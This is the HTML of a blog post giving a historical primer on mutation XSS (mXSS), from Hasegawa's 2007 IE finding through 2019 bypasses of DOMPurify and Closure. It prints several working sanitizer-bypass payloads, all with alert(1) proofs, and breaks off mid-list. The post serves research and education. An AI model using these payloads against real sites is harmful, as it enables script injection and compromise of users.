<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> MXSS Evolution and Timeline: A primer to MXSS | s1r1us Blog</title>
  <link rel = 'canonical' href = '//localhost:1313/posts/mxss-101/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:url" content="//localhost:1313/posts/mxss-101/">
  <meta property="og:site_name" content="s1r1us Blog">
  <meta property="og:title" content="MXSS Evolution and Timeline: A primer to MXSS">
  <meta property="og:description" content="MXSS Evolution and Timeline
Note this a document which I created while working on the MXSS video series https://youtu.be/aczTceXp49U, its very raw just random thoughts added here, if you want anything to change. feel free to pr.
How Do HTML Sanitizers Work? Sanitizers are tools designed to filter harmful content from HTML, making it safe to insert into a webpage. The process involves several steps:
Parsing: The HTML content is parsed into a DOM tree on either the server or in the browser. Sanitization: The sanitizer iterates through the DOM tree to remove dangerous or harmful content. Serialization: After sanitizing, the DOM tree is serialized back into an HTML string. Re-parsing: The serialized HTML is assigned to innerHTML, triggering another parsing process. Appending to Document: The final, sanitized DOM tree is appended to the document. However, despite these steps, sanitizers—especially server-side ones—can fail due to parser differentials between server and client. A server-side sanitizer might miss dangerous content that behaves differently when parsed by a browser. A typical example is when content is treated as RAWTEXT on the server but as active HTML in the browser.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-09-03T13:40:27+05:30">
    <meta property="article:modified_time" content="2024-09-03T13:40:27+05:30">
    <meta property="article:tag" content="Mxss">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="MXSS Evolution and Timeline: A primer to MXSS">
  <meta name="twitter:description" content="MXSS Evolution and Timeline
Note this a document which I created while working on the MXSS video series https://youtu.be/aczTceXp49U, its very raw just random thoughts added here, if you want anything to change. feel free to pr.
How Do HTML Sanitizers Work? Sanitizers are tools designed to filter harmful content from HTML, making it safe to insert into a webpage. The process involves several steps:
Parsing: The HTML content is parsed into a DOM tree on either the server or in the browser. Sanitization: The sanitizer iterates through the DOM tree to remove dangerous or harmful content. Serialization: After sanitizing, the DOM tree is serialized back into an HTML string. Re-parsing: The serialized HTML is assigned to innerHTML, triggering another parsing process. Appending to Document: The final, sanitized DOM tree is appended to the document. However, despite these steps, sanitizers—especially server-side ones—can fail due to parser differentials between server and client. A server-side sanitizer might miss dangerous content that behaves differently when parsed by a browser. A typical example is when content is treated as RAWTEXT on the server but as active HTML in the browser.">

  
  
    
  
  
  <link rel="stylesheet" href="/css/styles.c6b6e1ea2d9a5ffc60bdd43664058a8fd8caa59181519f76ad68e7a40bb909a902c804ca6e312bd35f003597a2c2414752dd34cd7b14cc9e94ffce9bd1e69136.css" integrity="sha512-xrbh6i2aX/xgvdQ2ZAWKj9jKpZGBUZ92rWjnpAu5CakCyATKbjEr018ANZeiwkFHUt00zXsUzJ6U/86b0eaRNg=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="//localhost:1313/images/favicon.ico" />

  
  
  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Posts</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" //localhost:1313/posts/mxss-why-should-we-follow-spec/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="//localhost:1313/about/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&text=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&is_video=false&description=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&title=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&name=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS&description=%3cp%3e%3cstrong%3eMXSS%20Evolution%20and%20Timeline%3c%2fstrong%3e%3c%2fp%3e%0a%3cp%3eNote%20this%20a%20document%20which%20I%20created%20while%20working%20on%20the%20MXSS%20video%20series%20%3ca%20href%3d%22https%3a%2f%2fyoutu.be%2faczTceXp49U%22%3ehttps%3a%2f%2fyoutu.be%2faczTceXp49U%3c%2fa%3e%2c%20its%20very%20raw%20just%20random%20thoughts%20added%20here%2c%20if%20you%20want%20anything%20to%20change.%20feel%20free%20to%20pr.%3c%2fp%3e%0a%3ch3%20id%3d%22how-do-html-sanitizers-work%22%3e%3cstrong%3eHow%20Do%20HTML%20Sanitizers%20Work%3f%3c%2fstrong%3e%3c%2fh3%3e%0a%3cp%3eSanitizers%20are%20tools%20designed%20to%20filter%20harmful%20content%20from%20HTML%2c%20making%20it%20safe%20to%20insert%20into%20a%20webpage.%20The%20process%20involves%20several%20steps%3a%3c%2fp%3e%0a%3col%3e%0a%3cli%3e%3cstrong%3eParsing%3a%3c%2fstrong%3e%20The%20HTML%20content%20is%20parsed%20into%20a%20DOM%20tree%20on%20either%20the%20server%20or%20in%20the%20browser.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eSanitization%3a%3c%2fstrong%3e%20The%20sanitizer%20iterates%20through%20the%20DOM%20tree%20to%20remove%20dangerous%20or%20harmful%20content.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eSerialization%3a%3c%2fstrong%3e%20After%20sanitizing%2c%20the%20DOM%20tree%20is%20serialized%20back%20into%20an%20HTML%20string.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eRe-parsing%3a%3c%2fstrong%3e%20The%20serialized%20HTML%20is%20assigned%20to%20%3ccode%3einnerHTML%3c%2fcode%3e%2c%20triggering%20another%20parsing%20process.%3c%2fli%3e%0a%3cli%3e%3cstrong%3eAppending%20to%20Document%3a%3c%2fstrong%3e%20The%20final%2c%20sanitized%20DOM%20tree%20is%20appended%20to%20the%20document.%3c%2fli%3e%0a%3c%2fol%3e%0a%3cp%3eHowever%2c%20despite%20these%20steps%2c%20sanitizers%e2%80%94especially%20server-side%20ones%e2%80%94can%20fail%20due%20to%20%3cstrong%3eparser%20differentials%3c%2fstrong%3e%20between%20server%20and%20client.%20A%20server-side%20sanitizer%20might%20miss%20dangerous%20content%20that%20behaves%20differently%20when%20parsed%20by%20a%20browser.%20A%20typical%20example%20is%20when%20content%20is%20treated%20as%20RAWTEXT%20on%20the%20server%20but%20as%20active%20HTML%20in%20the%20browser.%3c%2fp%3e" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2fmxss-101%2f&t=MXSS%20Evolution%20and%20Timeline%3a%20A%20primer%20to%20MXSS" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        MXSS Evolution and Timeline: A primer to MXSS
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-09-03 13:40:27 &#43;0530 IST" itemprop="datePublished">2024-09-03</time>
          
        </div>
        
         | 
        <a class="a" href="/">Home</a>
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><strong>MXSS Evolution and Timeline</strong></p>
<p>Note this a document which I created while working on the MXSS video series <a href="https://youtu.be/aczTceXp49U">https://youtu.be/aczTceXp49U</a>, its very raw just random thoughts added here, if you want anything to change. feel free to pr.</p>
<h3 id="how-do-html-sanitizers-work"><strong>How Do HTML Sanitizers Work?</strong></h3>
<p>Sanitizers are tools designed to filter harmful content from HTML, making it safe to insert into a webpage. The process involves several steps:</p>
<ol>
<li><strong>Parsing:</strong> The HTML content is parsed into a DOM tree on either the server or in the browser.</li>
<li><strong>Sanitization:</strong> The sanitizer iterates through the DOM tree to remove dangerous or harmful content.</li>
<li><strong>Serialization:</strong> After sanitizing, the DOM tree is serialized back into an HTML string.</li>
<li><strong>Re-parsing:</strong> The serialized HTML is assigned to <code>innerHTML</code>, triggering another parsing process.</li>
<li><strong>Appending to Document:</strong> The final, sanitized DOM tree is appended to the document.</li>
</ol>
<p>However, despite these steps, sanitizers—especially server-side ones—can fail due to <strong>parser differentials</strong> between server and client. A server-side sanitizer might miss dangerous content that behaves differently when parsed by a browser. A typical example is when content is treated as RAWTEXT on the server but as active HTML in the browser.</p>
<h3 id="issue-with-server-side-sanitization-html-parser-differentials"><strong>Issue with Server-Side Sanitization: HTML Parser Differentials</strong></h3>
<p>Server-side sanitization can introduce problems due to the differences in how HTML is parsed by the browser versus the server. Using the same parser for both sanitization and insertion is often recommended.</p>
<p>For example, with the sanitize-html library:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dirty</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;svg&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clean</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sanitizeHtml</span>(<span style="color:#a6e22e">dirty</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#a6e22e">allowedTags</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sanitizeHtml</span>.<span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">allowedTags</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#e6db74">&#39;style&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>])
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>});
</span></span></code></pre></div><p>In this case, sanitize-html does not remove the text inside the <code>&lt;style&gt;</code> tag, thinking it won’t be rendered as it’s RAWTEXT. However, the browser treats <code>&lt;style&gt;</code> inside an SVG differently, causing it to be parsed as HTML, and thus the malicious <code>&lt;img&gt;</code> tag is executed.</p>
<h3 id="earliest-mxss-exploit-yosuke-hasegawa-2007"><strong>Earliest MXSS Exploit: Yosuke Hasegawa (2007)</strong></h3>
<p>The earliest recorded instance of Mutation XSS was discovered by <strong>Yosuke Hasegawa</strong> in 2007. This vulnerability involved Internet Explorer and its handling of the <code>alt</code> attribute. Hasegawa noticed that an attribute with two backticks (&ldquo;alt=<code>onerror=alert(1)</code>&rdquo;) caused IE to strip the quotes, leading to an XSS vulnerability. This became the first documented case of Mutation XSS.</p>
<p><em>Payload:</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;``onerror=alert(1)&#34;</span> /&gt;
</span></span></code></pre></div><p>Read more about this discovery on Hasegawa&rsquo;s blog <a href="https://hasegawa.hatenablog.com/entries/2007/03/13">here</a>.</p>
<h3 id="mxss-from-2007-to-2013"><strong>MXSS from 2007 to 2013</strong></h3>
<p>Between 2007 and 2013, various researchers, including <strong>Mario Heiderich</strong>, <strong>LeverOne</strong>, <strong>Gareth Heyes</strong>, explored and documented MXSS vulnerabilities. One notable case was Mario’s discovery in 2011 (Mozilla bug <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=650001">650001</a>) that showed how SVG content could trigger MXSS through <code>innerHTML</code> mutations.</p>
<p><em>Payload:</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">&lt;!doctype html&gt;</span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;p&gt;</span>
</span></span></code></pre></div><p>The slackers group where lot of this stuff shared and I don&rsquo;t think it was called MXSS at that time: <a href="https://web.archive.org/web/20131110003021/http://sla.ckers.org/forum/list.php?2,page=1">https://web.archive.org/web/20131110003021/http://sla.ckers.org/forum/list.php?2,page=1</a></p>
<h3 id="marios-2013-paper-the-innerhtml-apocalypse"><strong>Mario’s 2013 Paper: The InnerHTML Apocalypse</strong></h3>
<p>In Mario’s paper, the attacker prepares an HTML or XML string that seems safe during the first parsing. However, upon insertion into the browser’s DOM using <code>innerHTML</code>, the browser mutates the string unpredictably. This mutated structure can allow the execution of JavaScript even after sanitization.</p>
<p>In Mario&rsquo;s 2013 talk at Hack in Paris titled <em>&ldquo;The InnerHTML Apocalypse&rdquo;</em>, he demonstrated how MXSS could bypass even the most well-secured applications through these mutations.</p>
<p>Learn more about his research <a href="https://repo.zenk-security.com/Conferences/Hack%20in%20Paris%202013/The%20Inner%20HTML%20Apocalypse%20-%20How%20MXSS%20Attacks%20Change%20Everything%20We%20Believed%20to%20Know%20so%20Far.pdf">here</a>.</p>
<p>Read his paper: <a href="https://cure53.de/fp170.pdf">mXSS Attacks: 2013</a>.</p>
<h3 id="gareth-heyes-and-mxss-2012-2015"><strong>Gareth Heyes and MXSS (2012-2015)</strong></h3>
<p>Gareth Heyes was another researcher involved in MXSS research. Gareth&rsquo;s tweets from that period document numerous payloads that triggered MXSS in IE:</p>
<ul>
<li><code>&lt;% a=%&amp;gt&amp;lt;iframe/onload=alert(1)//&gt; #mxss IE&lt;=9</code></li>
<li><code>&lt;%/z=%&amp;gt&amp;lt;p/onresize=alert(1)//&gt;</code></li>
</ul>
<p>These tweets from 2014 <a href="https://x.com/garethheyes/status/526796862100365314">here</a> and <a href="https://x.com/garethheyes/status/529696573694160897">here</a> discuss the IE payloads and their effects.</p>
<h3 id="gareth-edge-mxss-2018-and-dompurify-bypass">Gareth Edge MXSS 2018 and DOMPurify Bypass</h3>
<p><strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>	&lt;<span style="color:#f92672">title</span>&gt;&amp;lt/title&amp;gt&amp;ltimg&amp;sol;src=&amp;quot&amp;quotonerror&amp;equals;alert(1)<span style="color:#960050;background-color:#1e0010">&amp;</span>gt
</span></span></code></pre></div><p><strong>Description</strong><br>
<strong>Edge just decodes entities inside title</strong></p>
<p><strong>Link</strong><br>
<a href="http://www.thespanner.co.uk/2018/07/29/bypassing-dompurify-with-mxss/"><strong>http://www.thespanner.co.uk/2018/07/29/bypassing-dompurify-with-mxss/</strong></a></p>
<h3 id="masato-dompurify-closure--bypass-and-google-xss-feb-2019">Masato DOMPurify Closure  Bypass and Google XSS Feb 2019</h3>
<p><strong>Description:</strong><br>
In the browser&rsquo;s DOMParser API, the JavaScript is considered disabled, content inside the &lt;noscript&gt; tag is interpreted as RAWTEXT. So, When using DOMParser, everything inside &lt;noscript&gt; is treated as raw text. However, once inserted into the page with JavaScript enabled, the contents of the &lt;noscript&gt; tag are re-parsed and executed as HTML.</p>
<p><strong>Google XSS Payload: Closure sanitization bypass</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">noscript</span>&gt;&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&#34;</span>&gt;
</span></span></code></pre></div><p><strong>Link to patch</strong>:<br>
<a href="https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa">https://github.com/google/closure-library/commit/c79ab48e8e962fee57e68739c00e16b9934c0ffa</a></p>
<p><strong>Dompurify bypass Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#e6db74">&#34;a&lt;noscript&gt;&lt;p id=&#39;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&#39;&gt;&lt;/p&gt;&lt;/noscript&gt;&#34;</span>, {<span style="color:#a6e22e">ADD_TAGS</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;noscript&#39;</span>]});
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#34;a&lt;noscript&gt;&lt;p id=&#34;</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&#34;&gt;&lt;/p&gt;&lt;/noscript&gt;</span>
</span></span></code></pre></div><h3 id="masato-noembed-mxss-in-ff-and-chrome-feb-2019">Masato noembed MXSS in FF and Chrome Feb 2019</h3>
<p><strong>Description:</strong><br>
<em>Chrome decodes HTML entities inside &lt;noembed&gt; tags when it is parsed by DOMParser APIs.</em><br>
<em>Firefox decodes HTML entities inside &lt;noscript&gt; tags when it is parsed by DOMParser APIs.</em>
<strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>	<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMParser</span>().<span style="color:#a6e22e">parseFromString</span>(<span style="color:#e6db74">&#39;A &lt;noembed&gt; B &amp;lt;/noembed&amp;gt; C &amp;lt;img src=x onerror=alert(1)&amp;gt;  D &lt;/noembed&gt; E&#39;</span>,<span style="color:#e6db74">&#39;text/html&#39;</span>).<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#34;A &lt;noembed&gt; B &lt;/noembed&gt; C &lt;img src=x onerror=alert(1)&gt;  D &lt;/noembed&gt; E&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#a6e22e">A</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">noscript</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">B</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lt</span>;<span style="color:#960050;background-color:#1e0010">/noscript&amp;gt; C &amp;lt;img src=x onerror=alert(1)&amp;gt; D &lt;/noscript&gt; E</span>
</span></span></code></pre></div><p><strong>Links:</strong><br>
<a href="https://issues.chromium.org/issues/40090296">https://issues.chromium.org/issues/40090296</a><br>
<a href="https://bugzilla.mozilla.org/show">https://bugzilla.mozilla.org/show</a>_bug.cgi?id=1528997</p>
<h3 id="svgp-mxss-2019-securitymb"><!-- raw HTML omitted --><!-- raw HTML omitted --> MXSS 2019 SecurityMB:</h3>
<p><strong>Chrome bug:</strong> <a href="https://issues.chromium.org/issues/40050167">https://issues.chromium.org/issues/40050167</a></p>
<p><strong>Switch:</strong> SVG to HTML</p>
<p><strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>	&lt;<span style="color:#f92672">svg</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">g</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#34;&gt;
</span></span></code></pre></div><h4 id="description">Description:</h4>
<ul>
<li><code>&lt;svg&gt;&lt;p&gt;</code> gets parsed to: <code>&lt;svg&gt;&lt;/svg&gt;&lt;p&gt;&lt;/p&gt;</code></li>
<li>However, interesting thing happens if you put closing tag <code>&lt;/p&gt;</code> in <code>&lt;svg&gt;</code>:</li>
<li><code>&lt;svg&gt;&lt;/p&gt;</code> gets parsed to <code>&lt;svg&gt;&lt;p&gt;&lt;/p&gt;&lt;/svg&gt;</code>.</li>
<li>So now the opening <code>&lt;p&gt;</code> is within <code>&lt;svg&gt;</code> which means that it will get out eventually when it is written to the DOM tree.</li>
</ul>
<p><strong>Links:</strong></p>
<ul>
<li>Spec bug: <a href="https://github.com/whatwg/html/issues/5113">https://github.com/whatwg/html/issues/5113</a></li>
<li>Chrome issue: <a href="https://issues.chromium.org/issues/40050167">https://issues.chromium.org/issues/40050167</a></li>
<li>Blog: <a href="https://research.securitum.com/dompurify-bypass-using-mxss/">https://research.securitum.com/dompurify-bypass-using-mxss/</a></li>
</ul>
<p><strong>Other variants:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">textarea</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;/</span><span style="color:#f92672">textarea</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#f92672">alert</span><span style="color:#f92672">(</span><span style="color:#f92672">1</span><span style="color:#f92672">)&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>or
